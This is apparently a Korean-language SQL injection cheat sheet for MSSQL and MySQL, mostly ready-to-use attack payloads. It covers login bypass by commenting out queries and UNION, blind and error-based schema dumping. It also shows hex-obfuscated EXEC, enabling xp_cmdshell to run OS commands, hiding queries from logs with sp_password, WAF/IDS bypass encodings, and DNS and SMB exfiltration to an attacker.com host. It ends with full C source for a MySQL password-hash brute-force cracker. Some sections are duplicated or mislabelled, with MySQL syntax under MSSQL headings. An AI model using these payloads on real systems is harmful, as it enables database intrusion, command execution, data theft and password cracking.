# MSSQL Injection Cheet Sheet
##### 링크: [KOROMOON][KOROMOONlink]
[KOROMOONlink]: https://koromoon.blogspot.com/2018/10/mssql-injection-cheet-sheet.html "Go KOROMOON"
##### 작성자: 김태현 사원
##### 작성일자: 2024년 4월 17일 
</br>

<br><div align="center"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTks81iuUfdMyDiGJs6xgSUxQEVA5zjfCDMgYShiNwWVDsgz9Drnr7p52BQDWhku98ZaALzGr6rFSBm2HqZVgCL-uYs4TlPYyxTpqCaWvR-vCcA7aUdpr-VzwLRMkkOnNojks9fLi1rCM/s1600/MSSQL+Injection.jpg"></div><br><br><br>

## (1) 기본 데이터베이스
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0d754497-e8a3-4ea7-99e8-dc7dea8f9acf)


<br><br><br>

## (2) 코멘트 아웃 쿼리(Comment Out Query)

여기서 코멘트 아웃(Comment Out)이란 디버그에서 자주 사용되는 방법으로 코멘트를 지시하는 문을 삽입하여 프로그램이나 명령어 집합의 일부를 일시적으로 사용하지 않는 것을 말함.<br><br>

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/32aaba19-680c-4cc2-9670-b1d33e23d718)
<br><br>
예 :<br>
`SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';`<br>
`SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';`<br><br><br>



## (3) 버전 테스팅

`@@VERSION`<br><br>

예 :<br>
MSSQL 버전이 2008 인 경우 참임.<br>
`SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';`<br><br>

노트 :<br>
결과값에 윈도우 운영 체제 버전도 포함됨.<br><br><br>


## (4) 데이터베이스 자격 증명

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0f5cfc77-20ee-466b-84b9-2a736a648d76)
<br><br>
예 :<br>
현재 사용자 반환 :<br>
`SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;`<br><br>

사용자가 관리자인지 확인하십시오 :<br>
`SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);`<br><br><br>


## (5) 데이터베이스 이름
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0a77393f-3fa0-494f-8b55-0e7443bcc915)
<br><br>
예 :<br>
`SELECT DB_NAME(5);`<br>
`SELECT name FROM master..sysdatabases;`<br><br><br>



## (6) 서버 호스트 이름
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0b7a9612-d675-4a05-a4ad-d0f3dd191e50)
<br><br>
예 :<br>
`SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');`<br><br>

노트 :<br>
SERVERPROPERTY() 는 MSSQL 2005 이상에서 사용할 수 있음.<br><br><br>




## (7) 테이블과 컬럼

**① 컬럼 수 결정**<br><br>

`ORDER BY n+1;`<br><br>
예 :<br>
`주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '1';`<br>&nbsp;

`1' ORDER BY 1--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
`1' ORDER BY 2--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
`1' ORDER BY 3--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
`1' ORDER BY 4--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.`<br>
`-1' UNION SELECT 1,2,3--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br><br>

노트 :<br>
거짓 결과값이 출력될 때까지 번호를 계속 증가시킴.<br><br>

다음은 현재 쿼리에서 컬럼을 가져오는데 사용할 수 있음.<br><br>

`GROUP BY / HAVING`<br><br>

예 :<br>
`주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '1';`<br><br>

`1' HAVING 1=1--`<br>
`'Users.username' 컬럼은 집계 함수 또는 GROUP BY 절에 포함되어 있지 않기 때문에 선택 목록에서 유효하지 않음.`<br><br>

`1' GROUP BY username HAVING 1=1--`<br>
`'Users.password' 컬럼은 집계 함수 또는 GROUP BY 절에 포함되어 있지 않기 때문에 선택 목록에서 유효하지 않음.`<br><br>

`1' GROUP BY username, password HAVING 1=1--`<br>
`'Users.permission' 컬럼은 집계 함수 또는 GROUP BY 절에 포함되어 있지 않기 때문에 선택 목록에서 유효하지 않음.`<br><br>

`1' GROUP BY username, password, permission HAVING 1=1--`<br>
`에러 없음.`<br><br>

노트 :<br>
모든 컬럼이 포함되면 에러는 반환되지 않음.<br><br>

**② 테이블 검색**<br><br>

우리는 두 개의 서로 다른 데이터베이스(information_schema.tables 또는 master..sysobjects)에서 테이블을 검색할 수 있음.<br><br>

**ⓐ Union**<br><br>

`UNION SELECT name FROM master..sysobjects WHERE xtype='U'`<br><br>

**ⓑ Blind**<br><br>

`AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'`<br><br>

**ⓒ Error**<br><br>

`AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)`<br>
`AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))`<br><br>

노트 :<br>
Xtype = 'U' 는 사용자 정의 테이블임. 뷰에서는 'V' 를 사용할 수 있음.<br><br>

**③ 컬럼 검색**<br><br>

우리는 두 개의 서로 다른 데이터베이스(information_schema.tables 또는 master..sysobjects)에서 컬럼을 검색할 수 있음.<br><br>

**ⓐ Union**<br><br>

`UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')`<br><br>

**ⓑ Blind**<br><br>

`AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns > 'A'`<br><br>

**ⓒ Error**<br><br>

`AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)`<br>
`AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))`<br><br>

**④ 한 번에 여러 테이블/컬럼 검색**<br><br>

다음 세 가지 쿼리는 임시 테이블/컬럼을 만들고 모든 사용자 정의 테이블을 해당 테이블에 삽입함. 그런 다음 테이블 내용을 덤프하고 테이블을 삭제하여 마침.<br><br>

임시 테이블/컬럼 만들기 및 데이터 삽입 :<br>
`AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;`<br><br>

컨텐츠 덤프 :<br>
`AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);`<br><br>

테이블 삭제 :<br>
`AND 1=0; DROP TABLE TMP_DB;`<br><br>

더 쉬운 방법은 MSSQL 2005 이상부터 시작됨.<br>
XML PATH() 함수는 하나의 쿼리로 모든 테이블을 검색할 수 있도록 연결자로 작동함.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/48b93152-4f29-4b3c-a852-96a1adb085b6)<br><br>
노트 :<br>
쿼리를 16진수로 인코딩하여 공격을 난독화할 수 있음.<br>
`' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--`<br><br><br>





## (8) 인용 기호 피하기

`SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)`<br><br><br>


## (9) 문자열 연결
`SELECT CONCAT('a','a','a'); (SQL SERVER 2012)
SELECT 'a'+'d'+'mi'+'n';`<br><br><br>




## (10) 인용 기호 피하기
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/5a01a082-5220-43b7-912c-a9c3895ce90a)
<br><br>
예 :<br>
`IF 1=1 SELECT 'true' ELSE SELECT 'false';`<br>
`SELECT CASE WHEN 1=1 THEN true ELSE false END;`<br><br>

노트 :<br>
IF 는 SELEC 문 내에서 사용할 수 없음.<br><br><br>

## (11) 타이밍

`WAITFOR DELAY 'time_to_pass';`<br>
`WAITFOR TIME 'time_to_execute';`<br><br>

예 :<br>
`IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';`<br><br><br>



## (12) OPENROWSET 공격

`SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');`<br><br><br>



## (13) 시스템 명령어 실행

운영 체제 명령어를 실행하도록 하는 xp_cmdshell 확장 저장 프로시서를 포함시켜야 함.<br><br>

`EXEC master.dbo.xp_cmdshell 'cmd';`<br><br>

MSSQL 2005 이상 버전부터 xp_cmdshell 은 기본적으로 비활성화되어 있지만 다음 쿼리를 사용하여 활성화시킬 수 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/b230fab6-eab5-4eae-80a5-c4d30514cf24)
<br><br>
또는, 동일한 결과를 얻기 위해 자체 프로시저를 만들 수 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/fa3e8b41-f145-4f4c-9df9-79b56d864eb1)
<br><br>
SQL 버전이 2000 보다 높으면 이전 명령을 실행하기 위해 추가 쿼리를 실행해야 함.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e23a453d-167c-4bb9-ba4f-6e491be594aa)
<br><br>
예 :<br>
`xp_cmdshell 이 로드되어 활성화되어 있는지 확인한 다음 dir 명령어를 실행하여 그 결과값을 TMP_DB에 삽입함 :`<br>
`' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--`<br><br>

컨텐츠 덤프 :<br>
`' UNION SELECT tbl FROM TMP_DB--`<br><br>

테이블 삭제 :<br>
`' DROP TABLE TMP_DB--`<br><br><br>



## (14) SP_PASSWORD (쿼리 숨기기)

쿼리 끝에 sp_password 를 추가하면 T-SQL 로그에서 sp_password 를 숨김.<br><br>

`SP_PASSWORD`<br><br>

예 :<br>
`' AND 1=1--sp_password`<br><br>

결과값 :<br>
-- 'sp_password'는 이 이벤트의 텍스트에서 발견되었습니다.<br>
-- 보안상의 이유로 텍스트에 주석으로 대체되었습니다.<br><br><br>



## (15) 누적된 쿼리(Stacked Queries)

MSSQL 은 누적된 쿼리(Stacked Queries)를 지원함.<br><br>

예 :<br>
`' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');`<br><br><br>



## (16) 퍼징(Fuzzing)과 난독화(Obfuscation)

**① 허용된 중간 문자열**<br><br>

다음 문자는 공백으로 사용할 수 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e13ddea1-c1e7-467d-8af2-b202f959bb09)
<br><br>
예 :<br>
`S%E%L%E%C%T%01column%02FROM%03table;`<br>
`A%%ND 1=%%%%%%%%1;`<br><br>

노트 :<br>
키워드 간 백분율 기호는 ASP(X) 웹 응용 프로그램에서만 가능함.<br><br>

공백을 사용하지 않으려면 다음 문자를 사용할 수도 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/edbdba4d-6028-4735-9ff4-ce381ef558a4)
<br><br>
예 :<br>
`UNION(SELECT(column)FROM(table));`<br>
`SELECT"table_name"FROM[information_schema].[tables];`<br><br>

**② AND/OR 뒤에 허용되는 중간 문자열**<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/fbbcb836-a290-43a5-b22d-fa2bebe58b3d)
<br><br>
예 :<br>
`SELECT 1FROM[table]WHERE\1=\1AND\1=\1;`<br><br>

노트 :<br>
백슬러시는 MSSQL 2000 에서는 작동하지 않음.<br><br>

**③ 인코딩**<br><br>

주입을 인코딩하면 WAF/IDS 우회에 유용할 때도 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/72219964-16c4-4aaf-ab4b-0d097aecd1fb)



## (17) 대역 외 채널링

**① DNS Requests**<br><br>

1SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));1<br><br>

**② SMB Requests**<br><br>

`' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`<br><br><br>



### (18) 누적된 쿼리(Stacked Queries)

누적된 쿼리 기법은 하나의 쿼리에 추가적인 쿼리를 삽입하는 기법임.<br>
PHP 응용 프로그램이 데이터베이스와 통신하는 데 사용되는 드라이버에 따라 MySQL 에서 가능함.<br>
PDO_MYSQL 드라이버는 누적된 쿼리(Stacked Queries)를 지원함.<br>
MySQLi (Improved Extension) 드라이버는 multi_query() 함수를 통해 누적된 쿼리(Stacked Queries)를 지원함.<br><br>

예 :<br>
`SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username, password, priv) VALUES ('BobbyTables', 'kl20da$$','admin');`<br>
`SELECT * FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;`<br><br><br>



### (19) MySQL 특정 코드

MySQL 에서는 느낌표 뒤에 버전 번호를 지정할 수 있음.<br>
주석의 구문은 버전이 지정된 버전 번호보다 크거나 같으면 실행됨.<br><br>

예 :<br>
`UNION SELECT /*!50000 5,null;*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+`<br>
`SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);`<br><br>

노트 :<br>
첫 번째 예제는 버전을 반환함. 2개의 컬럼이 있는 UNION 을 사용함.<br>
두 번째 예제는 WAF/IDS 를 우회하는데 어떻게 사용되는 지를 보여줌.<br><br><br>



## (20) 퍼징(Fuzzing)과 난독화(Obfuscation)

**① 허용된 중간 문자열**<br><br>

다음 문자는 공백으로 사용할 수 있음.<br><br>

![스크린샷 2024-04-17 오후 2 31 34](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6e460be1-4209-415c-b762-5e5ca24c0d0f)<br><br>


예 :<br>
`'%0A%09UNION%0CSELECT%A0NULL%20%23`<br><br>

공백을 사용하지 않으려면 괄호를 사용할 수도 있음.<br><br>

![스크린샷 2024-04-17 오후 2 31 55](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/b1d2f79e-7522-4237-b6d3-54a87f7a67dc)<br><br>


예 :<br>
`UNION(SELECT(column)FROM(table))`<br><br>

**② AND/OR 뒤에 허용되는 중간 문자열**<br><br>

![스크린샷 2024-04-17 오후 2 32 24](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/abb3eb20-9560-4e48-ad81-4dc17033e743)<br><br>


예 :<br>
`SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))`<br><br>

노트 :<br>
DUAL 테이블은 테스트에 사용할 수 있는 더미 테이블임.<br><br>

**③ 주석으로 난독화**<br><br>

WAF/IDS 를 우회하기 위해 주석을 사용하여 쿼리를 분할할 수 있음.<br>
<p># 또는 -- 와 같은 개행 문자를 사용하여 쿼리를 별도의 줄로 나눌 수 있음.</p><br><br>

예 :<br>
`1'#`<br>
`AND 0--`<br>
`UNION# I am a comment!`<br>
`SELECT@tmp:=table_name x FROM--`<br>
`information_schema`.tables LIMIT 1#`<br><br>

URL 인코딩은 다은과 같이 나타냄 :<br>
`1'%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table_name x FROM--%0A`information_schema`.tables LIMIT 1%23`<br><br>

특정 함수는 주석과 공백으로 난독화할 수 있음.<br>
`VERSION/**/%A0 (/*comment*/)`<br><br>

**④ 인코딩**<br><br>

주입을 인코딩하면 WAF/IDS 우회에 유용할 때도 있음.<br><br>

![스크린샷 2024-04-17 오후 2 33 56](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/70bae8cc-b287-4b5f-bd03-a840fdc562b5)<br><br>


**⑤ 키워드 피하기**<br><br>

IDS/WAF 가 특정 키워드를 차단하는 경우 인코딩을 사용하지 않고 다른 키워드를 사용하는 방법이 있음.<br><br>

`information_schema.tables`<br><br>

![스크린샷 2024-04-17 오후 2 57 54](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/1101bf45-faee-48ba-a978-9439699e2304)<br><br>


노트 :<br>
대체 이름은 테이블에 있는 PRIMARY 키에 따라 다를 수 있음.<br><br><br>



## (21) 연산자

![스크린샷 2024-04-17 오후 2 58 37](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/dd796b56-e57d-41af-8846-9601392be528)<br><br><br>

## (22) 상수

![스크린샷 2024-04-17 오후 2 58 59](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e151303f-3b57-4edd-9045-17b423ba14c9)<br><br><br>




## (23) 패스워드 해싱(Password Hashing)

MySQL 4.1 이전 버전에서는 PASSWORD() 함수로 계산된 암호 해시는 16 바이트임.
이러한 해시는 다음과 같음.<br><br>

![스크린샷 2024-04-17 오후 2 59 22](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/07032ab1-0ae1-4fd4-a718-67b9a8269bec)<br><br>


MySQL 4.1 부터 PASSWORD() 함수는 더 긴 41 바이트 해시값으로 생성하도록 수정됨.<br><br>
![스크린샷 2024-04-17 오후 2 59 37](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6a3d5fc2-a145-478d-9bdb-10cfbd1e17fe)



## (24) 패스워드 크랙(Password Cracking)

Cain&Abel 과 John the Ripper 는 모두 MySQL 3.x-6.x 암호를 해독할 수 있음.<br>
JTR 용 Metasploit 모듈은 아래 링크에서 찾을 수 있음.<br>
http://www.metasploit.com/modules/auxiliary/analyze/jtr_mysql_fast<br><br>

**① MySQL < 4.1 Password Cracker**<br><br>

아래 코드는 MySQL 해시 암호용 고속 Brute-force 암호 크래커임.<br>
일반 PC 에서 인쇄 가능한 ASCII 문자가 포함된 8자리 암호를 몇 시간만에 해독할 수 있음.<br><br>

```/* This program is public domain. Share and enjoy.
*
* Example:
* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast
* $ MySQLfast 6294b50f67eda209
* Hash: 6294b50f67eda209
* Trying length 3
* Trying length 4
* Found pass: barf
*
* The MySQL password hash function could be strengthened considerably
* by:
* - making two passes over the password
* - using a bitwise rotate instead of a left shift
* - causing more arithmetic overflows
*/

#include <stdio.h>

typedef unsigned long u32;

/* Allowable characters in password; 33-126 is printable ascii */
#define MIN_CHAR 33
#define MAX_CHAR 126

/* Maximum length of password */
#define MAX_LEN 12

#define MASK 0x7fffffffL

int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
{
  int i, c;
  u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
  u32 newstate1, newstate2, newstate3;
  u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];
  u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];
  i = -1;
  sum = 7;
  state1_ary[0] = 1345345333L;
  state2_ary[0] = 0x12345671L;

  while (1) {
    while (i < stop) {
      i++;
      pass_ary[i] = MIN_CHAR;
      step_ary[i] = (state1_ary[i] & 0x3f) + sum;
      xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] << 8);
      sum += MIN_CHAR;
      state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
      state2_ary[i+1] = state2_ary[i]
        + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
    }

    state1 = state1_ary[i+1];
    state2 = state2_ary[i+1];
    step = (state1 & 0x3f) + sum;
    xor1 = step*MIN_CHAR + (state1 << 8);
    xor2 = (state2 << 8) ^ state1;

    for (c = MIN_CHAR; c <= MAX_CHAR; c++, xor1 += step) {
      newstate2 = state2 + (xor1 ^ xor2);
      newstate1 = state1 ^ xor1;

      newstate3 = (targ2 - newstate2) ^ (newstate2 << 8);
      div = (newstate1 & 0x3f) + sum + c;
      diff = ((newstate3 ^ newstate1) - (newstate1 << 8)) & MASK;
      if (diff % div != 0) continue;
      d = diff / div;
      if (d < MIN_CHAR || d > MAX_CHAR) continue;

      div = (newstate3 & 0x3f) + sum + c + d;
      diff = ((targ1 ^ newstate3) - (newstate3 << 8)) & MASK;
      if (diff % div != 0) continue;
      e = diff / div;
      if (e < MIN_CHAR || e > MAX_CHAR) continue;

      pass_ary[i+1] = c;
      pass_ary[i+2] = d;
      pass_ary[i+3] = e;
      return 1;
    }

    while (i >= 0 && pass_ary[i] >= MAX_CHAR) {
      sum -= MAX_CHAR;
      i--;
    }
    if (i < 0) break;
    pass_ary[i]++;
    xor_ary[i] += step_ary[i];
    sum++;
    state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
    state2_ary[i+1] = state2_ary[i]
      + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
  }

  return 0;
}

void crack(char *hash)
{
  int i, len;
  u32 targ1, targ2, targ3;
  int pass[MAX_LEN];

  if ( sscanf(hash, "%8lx%lx", &targ1, &targ2) != 2 ) {
    printf("Invalid password hash: %s\n", hash);
    return;
  }
  printf("Hash: %08lx%08lx\n", targ1, targ2);
  targ3 = targ2 - targ1;
  targ3 = targ2 - ((targ3 << 8) ^ targ1);
  targ3 = targ2 - ((targ3 << 8) ^ targ1);
  targ3 = targ2 - ((targ3 << 8) ^ targ1);

  for (len = 3; len <= MAX_LEN; len++) {
    printf("Trying length %d\n", len);
    if ( crack0(len-4, targ1, targ3, pass) ) {
      printf("Found pass: ");
      for (i = 0; i < len; i++)
        putchar(pass[i]);
      putchar('\n');
      break;
    }
  }
  if (len > MAX_LEN)
    printf("Pass not found\n");
}

int main(int argc, char *argv[])
{
  int i;
  if (argc <= 1)
    printf("usage: %s hash\n", argv[0]);
  for (i = 1; i < argc; i++)
    crack(argv[i]);
  return 0;
}
```
